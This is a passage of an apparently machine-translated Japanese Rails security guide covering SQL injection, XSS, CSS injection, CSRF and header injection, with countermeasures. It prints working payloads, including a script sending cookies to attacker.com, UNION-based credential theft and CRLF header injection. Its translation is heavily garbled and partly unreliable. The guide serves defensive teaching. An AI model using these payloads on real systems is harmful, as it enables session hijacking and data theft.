攻撃者がユーザーのセッション cookie が盗まれているし、したがって、アプリケーションを共同がありますのような状況だと思います。簡単にパスワードを変更する場合は、攻撃者は、わずか数回のクリックでアカウントをハイジャックします。または、攻撃者は、パスワードの変更フォームに CSRF 脆弱である場合は、彼を web ページに誘導することで、犠牲者のパスワードを変更するにはできるようになりますが、細工された IMG のタグは、CSRF。対策としては、 CSRF に対して安全なパスワードの変更フォーム、もちろん。それを変更する場合は、古いパスワードを入力するユーザーを必要とします。.

!!!6.2.2 電子メール

ただし、攻撃者もアカウントに電子メール アドレスを変更することによってかかることがあります。彼はそれを変更した後、彼はパスワードを忘れたときのページに行くし、（おそらく） パスワードは攻撃者の電子メール アドレスに郵送されます。対策も電子メール アドレスを変更する場合は、パスワードを入力するユーザーが必要として.

!!!6.2.3 他

Web アプリケーションによっては、ユーザーのアカウントをハイジャックする多くの方法がある可能性があります。多くのケースで CSRF と XSS はこれを行うに役立ちます。たとえば、CSRF のようにの脆弱性Google のメール。この概念実証の攻撃では、被害者、攻撃者によって制御されて web サイトに魅了されていると思います。そのサイトでは、細工された IMG のタグ Google メールのフィルター設定を変更、HTTP GET 要求の結果です。犠牲者が Google のメールにログインしていた場合は、攻撃者は彼の電子メール アドレスへのすべての電子メールを転送するフィルター変更でしょう。これは、アカウント全体をハイジャックとしてほぼ有害なです。対策としては、アプリケーション ロジックを確認しすべての XSS と CSRF 脆弱性を排除.

!!6.3 Captcha
""CAPTCHA の応答、コンピューターによって生成されないことを確認するのには、チャレンジ-レスポンス テストです。多くの場合、歪んだ画像の文字を入力するように求めるによって自動スパムボットからのコメント フォームを保護するために使用されます。否定的なキャプチャのアイデア彼は人間であることを証明が、ロボット、ロボットであることを明らかにするユーザーのためではないです。

だけでなくスパム ロボット （ボット） が、問題は、また自動ログイン ボット。人気のある CAPTCHA API の古い書物からの言葉の 2 つの歪んだ画像が表示されますこれです。後者が壊れていたので歪んだ背景と高レベルの上のテキストとして以前 Captcha 反りがやったのではなく、それも、斜めの線を追加します。ボーナスとして、これを使用して古い本をデジタル化するのに役立ちます。ReCAPTCHAプラグイン API として同じ名前を持つレールも。

2 つのキーは、API、公共、Rails 環境に配置する必要がある秘密キーから取得します。その後、コント ローラーの verify_recaptcha メソッドと recaptcha_tags メソッド ビューを使用することができます。Verify_recaptcha は、検証が失敗した場合 false を返します。Captcha の問題は、彼らは迷惑です。さらに、いくつかの視覚障害者ユーザー歪んだ Captcha の特定の種類を読むは難しいを発見しました。否定的な Captcha のアイデアでは彼は人間であることを証明を求めるなくスパム ロボット、ボットであることを明らかにすることです。

ほとんどのボットは、本当にばかな, 彼らはウェブをクロールし、スパムを見つけることができますすべてのフォームのフィールドに配置されます。否定的な Captcha を活用し、「ハニーポット」フィールドは、人間のユーザーからは、CSS や JavaScript によって非表示になります、フォームに含めます。

ここではいくつかのアイデア JavaScript や CSS のハニーポット フィールドを非表示にする方法です。

*フィールド ページの表示領域の外の位置します。
*要素が非常に小さくするか、ページの背景と同じ色
*表示、フィールドのままが、それらを空白のままに人間を教えてください

最も単純な否定的なキャプチャ 1 つの隠されたハニーポット フィールドです。サーバー側では、フィールドの値をチェックします: 任意のテキストが含まれている場合は、それがボットをする必要があります。ポストを無視するか、肯定的な結果がポストをデータベースに保存しないを返します。この方法は、ボットが満足され、に移動します。この迷惑なユーザーでは、あまりにも行うことができます。

高度な否定的な Captcha をネッド Batchelder のブログの記事で見つけることができます。

*現在 UTC タイムスタンプを持つフィールドを含めるし、サーバー上でチェックします。過去にあまりにも遠く、将来の場合は、フォームは無効です。
*フィールド名をランダム化します。
*送信ボタンを含む、すべての種類の 1 つ以上のハニーポット フィールドを含める
この、自動ボットだけからあなたを守りますこれでターゲットを絞ったオーダーメイド ボットを停止できないことに注意してください。否定的な Captcha をログイン フォームを保護するために良いことがあります。.

!!6.4 ログ
""パスワードがログ ファイルに入れないようにレールを教えてください。

既定では、ログを web アプリケーションにあるすべての要求のレールします。しかし、ログ ファイル、巨大なセキュリティ上の問題、することができますログイン資格情報が含まれている可能性がありますように、クレジット カードと cetera 番号します。Web アプリケーションのセキュリティの概念を設計するとき、また攻撃者 （フル） を得た場合に何が起こるかについて考える必要があります web サーバーへのアクセス。秘密と、データベース内のパスワードの暗号化は、ログ ファイルにクリア テキストで表示する場合、かなり無駄になります。特定のリクエスト パラメーター、ログ ファイルからフィルター config.filter_parametersアプリケーション構成に追加することができます。これらのパラメーターは [フィルター] でログ マークされます。
<<<
config.filter_parameters << :password
>>>

!!6.5 良いパスワード
""あなたはそれのすべてのパスワードを記憶するは難しいを見つけるか？それらを書き留めていないが各単語の最初の文字が文を覚えて簡単使用します。

ブルース ・ シュナイアー、セキュリティ技術者を分析している34,000 の現実世界のユーザー名とパスワード フィッシング攻撃を MySpace から下記記載されて。パスワードのほとんどがクラックする非常に簡単であることが判明しました。20 の最も一般的なパスワードです。

パスワードとは 1、abc123、myspace1、パスワード、blink182、qwerty1、* * *、123abc、baseball1、football1、123456、サッカー、monkey1、liverpool1、princess1、jordan23、slipknot1、superman1、iloveyou1 と猿。

これらのパスワードは 4 割が辞書にある単語と大多数が実際に英数字です面白いです。ただし、パスワード クラッカーの辞書が含まれている今日のパスワードの数が多い、彼らはすべての種類 (英数字) の組み合わせのうちしようと。あなたのアカウントは、攻撃者は自分のユーザー名を知っているし、弱いパスワードを使用する場合は、簡単にクラックされます。

良いパスワードは長い英数字の組み合わせの混在するケースです。これは非常に覚えておくは難しいように、簡単に思い出せる文の最初の文字だけを入力することをお勧めします。たとえば「速い茶色のキツネがのろまな犬をジャンプ」"Tqbfjotld"になります。彼らはあまりにもクラッカー辞書でを表示可能性がありますこれだけの例は、このようなよく知られているフレーズを使用しないでください注意してください。

!!6.6 正規表現
""Ruby の正規表現の一般的な落とし穴を終了し、文字列の先頭と一致です ^ と $ \A と \z ではなく。

Ruby では、多くの他の言語よりもわずかに異なるアプローチを使用して終わりと、文字列の先頭と一致します。だからこそ、さらに多くの Ruby と Rails の書籍これは間違っています。これはセキュリティ上の脅威か？疎 URL フィールドを検証したいと言うと、このような単純な正規表現を使用します。
<<<
/^https?:\/\/[^\n]+$/i
>>>
これは一部の言語でうまくことがあります。ただし、ルビーの ^ と $先頭と行の行末に一致する。このため、フィルターの問題もなくこのような URL を渡します。
<<<
javascript:exploit_code();/*
http://hi.com
*/
>>>
この URL がフィルターを通過正規表現と一致する-2 番目の行、ため、残りの問題ではないです。今我々 がこのような URL を示したビューかを想像：
<<<
link_to "Homepage", @user.homepage
>>>
リンクの訪問者に罪のない見えますが、それがクリックされると、JavaScript 関数"exploit_code"を実行しますまたは任意の他の JavaScript、攻撃者を提供しています。

正規表現を修正するには、\A と \z の代わりに使用する必要があります ^ と $ は、ましょう。
<<<
/\Ahttps?:\/\/[^\n]+\z/i
>>>
これは頻繁に間違いですので、指定した正規表現が始まる場合形式検証 (validates_format_of) 今、例外が発生 ^ または $ が終了します。使用する場合は ^ と $ \A と \z （これはまれな） ではなく、あなたが設定することができます、: true の場合、以下のように複数行のオプション。

<<<
# content should include a line "Meanwhile" anywhere in the string
validates :content, format: { with: /^Meanwhile$/, multiline: true }
>>>
これだけあなたに対して最も一般的な間違いを保護形式検証を使用する場合する - 常に維持する必要があります注意してください注意して ^ $先頭と行行末先頭と文字列の末尾ではない Rubyと一致します。

6.7 特権エスカレーション
""1 つのパラメーターを変更する許可されていないユーザー アクセスを与える可能性があります。すべてのパラメーター、どのくらいを隠す、それの難読化に関係なく変更する可能性があることに注意してください。

ユーザーが改ざん可能性があります 1、id であるに対し、最も一般的なパラメーター http://www.domain.com/project/1のように、id パラメーターは。Params コント ローラーで利用可能ななります。最も可能性の高いこのような何かを行います。
<<<
@project= Project.find(params[:id])
>>>
いくつかの web アプリケーションが、確かにです、ユーザーは、すべてのプロジェクトを表示する権限がない場合ではないです。ユーザー id を 42 に変更し、彼はその情報を参照してくださいすることはできない場合は、彼はとにかくそれへのアクセス必要があります。代わりに、ユーザーのアクセス権をあまりにもクエリ:
<<<
@project= @current_user.projects.find(params[:id])
>>>
Web アプリケーションによっては、ユーザーが改ざんすることができます多くのより多くのパラメーターがあります。親指のルールとして、ないユーザー入力データがセキュリティで保護された、それ以外の場合は、証明されるまで、可能性のあるユーザーからのすべてのパラメーターを操作.

セキュリティによって難読化および JavaScript セキュリティによって惑わされないでください。Mozilla Firefox のためのウェブ開発者向けツールバーを確認し、すべてのフォームの非表示フィールドを変更することができます。ユーザー入力データを検証する予期しない値を持つ悪意のある要求を送信する攻撃者を防ぐ確かではないが java スクリプトの設定を使用することができます。Mozilla Firefox 用のプラグインをライブ Http ヘッダーは、すべての要求をログに記録しを繰り返し、それらを変更可能性があります。任意の JavaScript の検証をバイパスする簡単な方法です。任意の要求と応答からとインターネットを傍受することができますもクライアント側プロキシです。

!7 注入
""注入は、そのセキュリティ コンテキスト内で実行するために、web アプリケーションに悪意のあるコードまたはパラメーターを導入する攻撃のクラスです。注入の顕著な例は、クロス サイト スクリプティング (XSS) や SQL インジェクションです。

注入は、同じコードまたはパラメーターを 1 つのコンテキストでは、悪意のある使用することができますので、非常に難しいが、別の完全に無害です。コンテキストにはスクリプト、クエリ、またはプログラミング言語、シェルまたは Ruby/rails メソッドをすることができます。次のセクションは、インジェクション攻撃が起こる可能性がありますすべての重要なコンテキストをカバーします。最初のセクションでは、ただし、注入、建築に関する決定をカバーしています。

!!7.1 ホワイト リストとブラック リスト
消毒剤、保護またはホワイト ブラック リストに何かを確認します。

ブラック リストの悪い電子メール アドレス、パブリック以外のアクションまたは悪い HTML タグのリストをすることができます。これは、良いアドレス、パブリック アクション、良い HTML タグの電子メール リスト、ホワイト リストに反対しています。時々 それは (スパム フィルターで、たとえば)、ホワイト リストを作成することが可能ではありませんがホワイト リスト アプローチを使用することを好む:

Before_action のみを使用する： [...] の代わりを除く： [...]。それは新しくをオフにすることを忘れないでくださいこの方法アクションを追加します。
クロス サイト スクリプティング (XSS) に対して <script> を削除する代わりに <strong> ことができます。以下の詳細を参照してください。
ブラック リストでユーザ入力を修正しようとしないでください。
これは、作業の攻撃になる:"< sc <script> ript >".gsub ("<script>"""）
しかし、不正な入力を拒否します。
ホワイト リスト、ブラック リストに何かを忘れて、人的な問題に対する良いアプローチも。

!!7.2 SQL インジェクション
""巧妙な方法のおかげで、これはほとんど大部分の Rails アプリケーションの問題 します。問題を理解することが重要ですしかし、これは web アプリケーションでは、非常に壊滅的な一般的な攻撃です。

!!!7.2.1 導入

データベースのクエリに影響を与える web アプリケーション パラメーターを操作することによって SQL インジェクション攻撃を目指しています。SQL インジェクション攻撃の人気のある目的は、認証をバイパスします。別の目標は、データの操作または任意のデータの読み取りを実行します。ここではユーザー入力データをクエリで使用しない方法の例です。
<<<
Project.where("name = '#{params[:name]}'")
>>>
これは、検索操作で、ユーザーが彼を見つけるしたいプロジェクトの名前を入力可能性があります。悪意のあるユーザーが入力した場合 ' または 1-、結果として得られる SQL クエリになります。

SELECT* FROMprojects WHEREname= ''OR1 --'
2 つのダッシュはすべてそれの後を無視して、コメントを開始します。だからすべてのレコードを含め、プロジェクト テーブルからユーザーに視覚障害者返されます。条件がすべてのレコードを true であるためにです。

!!!7.2.2 バイパス承認

通常、web アプリケーションにはアクセス制御が含まれます。ユーザーがログイン資格情報を入力、web アプリケーションは、users テーブル内の一致するレコードを見つけるしようとします。レコードと認めるときは、アプリケーションでアクセスできます。ただし、攻撃者はおそらくこの SQL インジェクションのチェックをバイパス可能性があります。次標準的なデータベース クエリはユーザーによって指定されたログイン資格情報パラメーターに一致するユーザー テーブルの最初のレコードを検索するレールに示します。
<<<
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
>>>
攻撃者に入れば 'または '1' = 1 名と' または '2' > 1 パスワードとして SQL クエリの結果になります。
<<<
SELECT* FROMusers WHERElogin = ''OR'1'='1'ANDpassword= ''OR'2'>'1'LIMIT 1
>>>
これは単に見つける最初のデータベース内のレコードとこのユーザーにアクセスを許可します。

!!!7.2.3 無許可の読み取り

UNION ステートメント 2 つの SQL クエリを接続し、データで 1 つのセットを返します。攻撃者が任意のデータをデータベースから読み取ること利用することができます。上記の例を見てみましょう。
<<<
Project.where("name = '#{params[:name]}'")
>>>
そして今、UNION ステートメントを使用して別のクエリをしましょう注入します。
<<<
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
>>>
これは次の SQL クエリで発生します。
<<<
SELECT* FROMprojects WHERE(name =  '') UNION
  SELECTid,login ASname,passwordASdescription,1,1,1 FROMusers --'
>>>
(がないため、空の名前を持つプロジェクト) がプロジェクトの一覧はできません、ユーザー名およびパスワードの一覧が。ので、うまくいけば、データベースのパスワードを暗号化 ！攻撃者のための唯一の問題は、列の数は両方のクエリで同じでなければなりません。そういうわけで、2 番目のクエリが含まれているもの (1) は常に値 1、最初のクエリで列数と一致するためのリスト。

また、web アプリケーションはユーザー テーブルからの値が表示されるように 2 番目のクエリとしてステートメントのいくつかの列を変更します。あなたのレールには、少なくとも 2.1.1に更新してください。.

!!!7.2.4 対策

Ruby on Rails が脱出する特別な SQL 文字の組み込みのフィルターは、'"、文字や改行は null を返します。を使用してModel.find(id)またはModel.find_by_some thing(something)この対策を自動的に適用されます。しかし SQL フラグメント、特に条件内のフラグメント (where("..."))、 connection.execute()またはModel.find_by_sql()メソッドを手動で適用するのには.

条件オプションに文字列を渡す代わりに、このような汚染された文字列をサニタイズする配列を渡すことができます。
<<<
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
>>>
参照してくださいすることができます、配列の最初の部分、SQL フラグメントを疑問符 () です。配列の 2 番目の部分で変数のサニタイズ バージョン質問記号に置き換えます。または、同じ結果のハッシュを渡すことができます。
<<<
Model.where(login: entered_user_name, password: entered_password).first
>>>
配列やハッシュのフォームのみモデル インスタンスで利用可能です。sanitize_sql()他の場所を試すことができます。それは外部 SQL 文字列を使用する場合、セキュリティ上の影響について考える習慣を作る.

!!7.3 クロス サイト スクリプティング (XSS)
""最も普及している web アプリケーションの最も壊滅的なセキュリティの脆弱性の 1 つです XSS。この悪意のある攻撃は、クライアント側の実行可能コードを挿入します。レールは、これらの攻撃をかわすためのヘルパー メソッドを提供します。

!!!7.3.1 エントリ ポイント

エントリ ポイントの脆弱性の URL とそのパラメーター、攻撃者に攻撃を開始することができますです。

最も一般的なエントリ ポイント メッセージの投稿、ユーザー コメント ゲスト ブック プロジェクト タイトルがドキュメントの名前、検索結果のページはまた脆弱性 - はどこにもについて、ユーザー データを入力することができますされています。しかし、入力は、必ずしも入力ボックスから web サイトに来る必要はありません、それは任意の URL パラメーター-明白な隠されたまたは内部をすることができます。ユーザーがすべてのトラフィックを傍受可能性があります覚えています。本物の HTTP ヘッダーの Firefox のプラグイン、またはクライアント サイト プロキシなどのアプリケーションが要求を変更するには簡単にできます。

XSS 攻撃のこのような作業: 攻撃者は、いくつかのコードを挿入します、web アプリケーションは保存後に被害者に提示、ページが表示されます。ほとんどの XSS の例単に、警告ボックスが表示が、それよりもより強力です。XSS することができますクッキーを盗む、セッション ハイジャック、被害者を偽のウェブサイトにリダイレクト、攻撃者の利益のために広告を表示、機密情報を取得または悪意のあるソフトウェアのセキュリティ ホールを介して、web ブラウザーにインストールするには、この web サイト上の要素を変更します。

2007 年の後半には、Mozilla ブラウザー、22 の Safari、18 の IE と 12 のオペラで報告 88 の脆弱性があった。シマンテック グローバル インター ネット セキュリティ脅威レポートも 2007 年の最後の 6 ヶ月で 239 のブラウザーのプラグインの脆弱性を記載されて。Mpackがこれらの脆弱性の悪用は非常にアクティブと最新の攻撃のフレームワークです。ハッカーの web アプリケーション フレームワークは、SQL インジェクション脆弱性を悪用し、悪意のあるコード テキスト テーブルの各列に挿入することは非常に魅力的です。2008 年 4 月よりも 510,000 サイトこのようなそれらの間で、英国がハッキングされた政府、国連と多くのより高いターゲット。

エントリ ポイントの比較的新しい、珍しい形バナー広告です。以前の 2008 年では、悪意のあるコード MySpace やエキサイトなどの人気のあるサイトにバナー広告をトレンド マイクロによると登場.

!!!7.3.2 HTML/JavaScript インジェクション

最も一般的な XSS 言語はもちろん、最も人気のあるクライアント側のスクリプト言語 JavaScript、HTML との組み合わせで多くの場合です。エスケープ ユーザー入力が不可欠であります。.

XSS を確認する最も簡単なテスト。
<<<
<script>alert('Hello');</script>
>>>
この JavaScript コード単に警告ボックスが表示されます。次の例はまったく同じ、非常に珍しい場所でのみ行います。
<<<
<imgsrc=javascript:alert('Hello')>
<tablebackground="javascript:alert('Hello')">
>>>
!!!!7.3.2.1 クッキーの盗難

これらの例がこれまでのところどんな害をしない、それでは攻撃者がユーザーの cookie を盗むことができる方法を参照してください （と、したがって、ユーザーのセッションをハイジャック）。JavaScript で document.cookie プロパティを使用してドキュメントの cookie の読み書きをすることができます。Java スクリプトの設定をスクリプト 1 つのドメインから別のドメインのクッキーにアクセスできないことを意味します、同一生成元ポリシー、適用します。Document.cookie プロパティは元の web サーバーの cookie を保持します。しかし、読むし、(XSS が発生すると）、コードを HTML ドキュメントに直接埋め込む場合にこのプロパティを書き込むことができます。このどこにでも独自のクッキーを参照してください、結果ページに、web アプリケーションで挿入します。
<<<
<script>document.write(document.cookie);</script>
>>>
被害者には彼自身のクッキーは攻撃者にとっては、もちろん、これは使用されません。次の使用例は、URL http://www.attacker.com/に加え、cookie からイメージを読み込むを試みます。ブラウザーは、何も表示されませんのでもちろんこの URL、存在しません。しかし、攻撃者は被害者のクッキーを見ること彼 web サーバーのアクセス ログ ファイルを確認することができます。
<<<
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
>>>
このようながwww.attacker.comでログ ファイルを読み取る。
<<<
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
>>>
Document.cookie JavaScript が読み取れないことがありますように cookie にhttpOnlyフラグを追加することによって、明白な方法） でこれらの攻撃を軽減できます。Http cookie のみ IE v6 から使用することができます。SP1 では、Firefox v2.0.0.5 およびオペラ 9.5。サファリはまだ検討している、それはオプションを無視します。それ以上の年齢の他のブラウザー (WebTV などの Mac 上の IE 5.5) 実際にページの読み込みに失敗することができます。Cookie には Ajax を使用して表示されますが、警告したものの。

!!!!7.3.2.2 改変

Web ページの書き換えと攻撃者のもの、たとえば、現在の虚偽の情報の多くを行うまたは cookie、ログイン資格情報または他の機密データを盗むために犠牲者が攻撃者の web サイトに誘導できます。最も人気のある方法は、iframe で外部ソースからのコードを含めることです。
<<<
<iframename=”StatPage” src="http://58.xx.xxx.xxx"width=5 height=5 style=”display:none”></iframe>
>>>
これは任意の HTML や java スクリプトの設定、外部ソースから読み込まれます、それはサイトの一部として埋め込まれます。この iframe は、実際に攻撃Mpack 攻撃フレームワークを使用して正当なイタリア語のサイトから取得されます。Mpack 悪意のあるソフトウェアのセキュリティ ホールを介して、web ブラウザーで-非常に正常にインストールしようとする、50 ％、攻撃の成功します。

専門的な攻撃は、web サイト全体をオーバー ラップまたは同じサイトの元のように見えますが、ユーザー名とパスワードが攻撃者のサイトに送信するログイン フォームを表示できませんでした。またはそれは CSS や JavaScript を使用して、web アプリケーション内の正当なリンクを非表示にすることができ、別の偽の web サイトにリダイレクトされますその場所を表示します。

インジェクション攻撃はそれら反映されますここで、ペイロードは後に、犠牲者に提示する保存されず、URL に含まれます。特に検索フォームは、検索文字列をエスケープするのに失敗します。次のリンクは、「ジョージ ・ ブッシュは... の委員長は、9 歳の男の子を任命」記載ページ表示。
<<<
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
>>>
!!!!7.3.2.3 対策

悪意のある入力のフィルターを非常に重要です。 が、それも、web アプリケーションの出力をエスケープすることが重要です。.

特に XSS のホワイト リストをブラック リストではなく入力フィルタ リングを行うことが重要です。ホワイト リスト状態できません値ではなく、値をフィルタ リングします。ブラック リストは完全ではありません。

「スクリプト」のブラック リストを削除、ユーザーの入力から想像してください。今、攻撃者が"<scrscriptipt>"に挿入後、フィルター「<script>」のままです。以前のバージョンのレールのブラック リスト アプローチ strip_tags()、strip_links() および sanitize() メソッドを使用しました。この種の注入が可能だったので、：

<<<
strip_tags("some<<b>script>alert('hello')<</b>/script>")
>>>
この返された」いくつか <script> alert('hello') </script>"が作業を攻撃。だからこそ私はホワイト リストのアプローチに、投票更新レール 2 メソッド sanitize() を使用して。

<<<
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
>>>
これは与えられたタグのみにより、あらゆる種類のトリックや不正な形式のタグに対しても、良い仕事をしています。

次のステップとして、特にユーザー入力を再表示するとき、アプリケーションのすべての出力を脱出することをお勧め入力 (検索フォーム例のように以前) をフィルタ リングされていません。使用escapeHTML() (またはその別名h()) メソッド、HTML を置換する文字を入力、"、<>, その解釈の表現の HTML で (&amp; &quot;、 &lt; と&gt;)。ただし、簡単に、プログラマはSafeErbプラグインを使用することをお勧めそれを使用することを忘れて発生することができます。SafeErb 外部ソースから文字列をエスケープすることを思い出します。

!!!!7.3.2.4 難読化およびエンコーディングの注入

新しい文字のエンコーディングは、Unicode など、他の言語の文字を送信する浮上してネットワーク トラフィックほとんど限られた西アルファベット順に基づいています。しかし、悪意のあるコードは、web ブラウザーを処理することができる場合がありますが、web アプリケーションはいない可能性があります異なるエンコードを隠すことができます、これも web アプリケーションへの脅威です。UTF-8 エンコードでは攻撃の方法はここにあります。
<<<
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
>>>
この例では、メッセージ ボックスがポップアップ表示されます。上記の sanitize() フィルターでは認識されます。難読化、文字列、およびこうして「あなたの敵を知ってもらうと"エンコードには素晴らしいツールは、 Hackvertorです。レールの sanitize() メソッドの攻撃エンコードをオフにかわすために、良い仕事をします。

!!!7.3.3 例地下から

今日の web アプリケーションへの攻撃を理解するためには、いくつか実世界の攻撃を見てお勧めします。

Js.Yamanner@m yahoo! メールのワームからの抜粋を示します。2006 年 6 月 11 日に登場し、最初のウェブメール インターフェイス ワームだった。
<<<
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
>>>
ワーム (があるため JavaScript) 通常すべてのターゲットおよび onload 属性タグ フィルター Yahoo の HTML/JavaScript フィルターに穴を悪用します。ワームのコードで onload 属性場所でご利用いただけますので、フィルターはただし、1 回だけ適用されます。ブラック リスト フィルターが完了していないし、なぜそれは、web アプリケーションで HTML/JavaScript を許可するは難しいです、これは良い例です。

もう一つの概念実証ウェブメール ワーム Nduja、クロス ドメインのワームの 4 つのイタリアのウェブメール サービスです。ロザリオと Valotta の紙の上の詳細します。両方のウェブメールのワームには目標、犯罪的ハッカーでお金を作ることができる何かを収穫のメール アドレスがあります。

2006 年 12 月はMySpace のフィッシング攻撃の 34,000 の実際のユーザー名とパスワードを盗まれました。攻撃のアイデアの URL は非常に説得力のある見たので"login_home_index_html"という名前のプロファイル ページを作成することでした。特別な細工がされた HTML と CSS は本物の MySpace コンテンツ ページから非表示にし、独自のログイン フォームを表示に使用されました。

MySpace サミーのワームは、CSS 注入のセクションで説明します。

!!7.4 CSS 注入
""いくつかのブラウザー （IE、いくつかのバージョンの Safari など） JavaScript CSS でできるため CSS 注入実際に JavaScript インジェクションです。2 回の web アプリケーションでカスタム CSS を考慮することについてだと思います。

CSS の注入は最高MySpace サミーのワーム、よく知られているワームが説明されています。このワームは自動的に単に彼のプロフィールを訪問サミー (攻撃者) にフレンド リクエストを送りました。いくつかの時間以内彼は以上 100 万の友達のリクエストがサイトがオフラインになることは MySpace には、あまりにも多くのトラフィックを作成します。ワームの技術的な説明を次に示します。

CSS できますしかし MySpace 多くのタグをブロックします。だからワームの作者 JavaScript CSS にこのような配置：
<<<
<div style="background:url('javascript:alert(1)')">
>>>
スタイル属性のペイロードであるので。しかし、単一引用符と二重引用符は既に使用されているために、ペイロードで許可されて引用はありません。Java スクリプトの設定が任意の文字列としてコードを実行する便利な eval() 関数。
<<<
<div id="mycode" expr="alert('hah!')"style="background:url('javascript:eval(document.all.mycode.expr)')">
>>>
単語"innerHTML"を非表示にスタイル属性が許す限り eval() 関数はブラック リストの入力フィルター、にとっては悪夢です。
<<<
alert(eval('document.body.inne' + 'rHTML'));
>>>
次の問題は MySpace の著者「java <NEWLINE> スクリプト」を使用するので単語"javascript"、フィルタ リングされたこの問題を回避します。
<<<
<div id="mycode" expr="alert('hah!')"style="background:url('java&#8629; script:eval(document.all.mycode.expr)')"> =
>>>

ワームの作者のための別の問題だった CSRF セキュリティ トークン。それらがなければ彼はポストの上のフレンド リクエストを送信できませんでした。彼はそれのまわりにすぐにページがユーザーを追加して、結果の CSRF をパースする前に送信トークン得た。

最後に、彼は彼は彼のプロフィール ページに注入された 4 KB のワームを得た。

Moz バインディングCSS プロパティは、CSS の JavaScript Gecko ベースのブラウザー （Firefox の例） で紹介する別の方法をことが分かった。

!!!7.4.1 対策

この例は、もう一度、ブラック リスト フィルターが決して完全であることを示した。Web アプリケーションでカスタム CSS はかなり珍しい機能です、しかし、私は、ホワイト リストの CSS フィルターの気づいていません。カスタムの色や画像を許可する場合はそれらを選択し、CSS で web アプリケーションを構築するユーザーを許可することができます。あなたは本当に 1 つ必要がある場合レールのsanitize()メソッドをモデルとしてホワイト リストの CSS フィルターを使用してください。

!!7.5 繊維射出
以外の (セキュリティ) のための HTML の書式を表示する場合は、サーバー側では HTML に変換されます、マーク アップ言語を使用します。RedClothルビーには、このような言語ですが、注意することがなく、また XSS に対して脆弱です。

たとえば、RedCloth は_test_テキスト斜体になります <em> テスト <em> に変換します。ただし、現在のバージョン 3.0.4 までは XSS に対して脆弱なままです。重大なバグを削除すべて新しいバージョン 4を取得します。ただし、対策はまだ適用もそのバージョンいくつかのセキュリティ バグがあります。ここではバージョン 3.0.4 の例：
<<<
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
>>>
使用の: filter_html 繊維プロセッサによって作成されていない HTML を削除します。

<<<
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
>>>
しかし、すべての HTML がフィルターされません、いくつかのタグ （デザイン） では、たとえば <a> ままになります。
<<<
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
>>>
!!!7.5.1 対策

RedCloth ホワイト リスト入力フィルターと組み合わせて使用する XSS セクション対策」の説明に従って勧めします。

!!7.6 Ajax 注入
""同じセキュリティ保護対策は Ajax アクションでは、「普通の」ものを撮影する必要があります。少なくとも 1 つの例外は： アクション、ビューが表示されない場合、出力がコント ローラーで既に、エスケープするが。

In_place_editor プラグイン、またはビュー、アクションの戻り値をエスケープする必要があるレンダリングのではなく、文字列を返すアクションを使用する場合。それ以外の場合は、XSS 文字列、戻り値が含まれる場合は、悪意のあるコードは、ブラウザーに返す際実行されます。H() メソッドを使用して、入力値をエスケープします。

!!7.7 コマンド ライン インジェクション
""ユーザーが指定したコマンド ライン パラメーターは慎重に使用します。

基になるオペレーティング システムのコマンドを実行するアプリケーションがある場合、Ruby でいくつかの方法がある: exec(command)、syscall(command)、system(command)、command。コマンドの全体または一部を入力できる場合は、これらの関数では、特に注意する必要があります。これは、ほとんどのシェルでは、それらをセミコロン (;) または垂直方向に連結する、別のコマンドは最初の 1 つの終わりに実行することができますバー (|)。

対策は、安全にコマンド ライン パラメーターを渡しますsystem(command, parameters)メソッドを使用するであります。.
<<<
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
>>>
!!7.8 ヘッダー注入
""HTTP ヘッダーに動的に生成され、特定の状況ではユーザー入力注入されることがあります。これは、偽のリダイレクトにつながることができます XSS または HTTP 応答の分割します。

HTTP リクエスト ヘッダーをユーザー エージェント (クライアント ソフトウェア)、Referer とクッキー] フィールドに、他の間で。応答ヘッダーなどがあるステータス コード、クッキーと場所 (リダイレクト先 URL) フィールド。それらのすべてをユーザーが提供して、努力をもっとまたはより少なく操作可能性があります。あまりにもこれらのヘッダー フィールドをエスケープしてください。たとえばとき、ユーザー エージェント、管理領域に表示。

それに加えて、それは、一部ユーザーの入力に基づいて応答ヘッダーを構築するとき何を知っていることが重要。たとえば、ユーザーが特定のページにリダイレクトします「Referer」フィールドで指定されたアドレスにリダイレクトするためのフォームを導入することを行うには。
<<<
redirect_to params[:referer]
>>>
何がレール起こる、文字列位置ヘッダー フィールドに置くし、302 (リダイレクト) 状態をブラウザーに送信します。まず最初に、悪意のあるユーザー, これか。
<<<
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
>>>
バグが原因 (Ruby と) レール バージョン 2.1.2 （除く） までハッカー任意のヘッダー フィールド挿入可能性があります。たとえば次のように。
<<<
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
>>>
注意してください"％ 0 d ％ 0 a""キャリッジ リターンは \r\n"の URL エンコードされているとライン フィード (CRLF) ルビー。最初の 2 番目の場所ヘッダー フィールドが上書きされるため、結果の HTTP ヘッダーの 2 番目の例は次であるので。
<<<
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
>>>
